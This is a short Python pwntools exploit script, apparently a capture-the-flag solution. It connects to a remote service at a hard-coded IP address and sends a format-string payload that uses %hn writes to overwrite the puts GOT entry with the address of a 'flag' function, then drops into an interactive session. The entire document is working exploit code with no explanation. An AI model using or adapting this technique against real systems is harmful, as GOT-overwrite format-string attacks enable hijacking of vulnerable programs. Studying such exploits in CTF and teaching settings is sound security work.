from pwn import *
r=remote("95.216.233.106",35403)
#r=process("./nra")
puts_got=0x804c018
flag=0x8049245

pay=''
pay+='%'+str(0x804)+'x'
pay+='%11$hn'
pay+='%'+str(0x9245-0x804)+'x'
pay+='%12$hn'
pay=pay.ljust(28,' ')
pay+=p32(0x804c01a)
pay+=p32(0x804c018)
print(pay)

r.sendline(pay)

r.interactive()

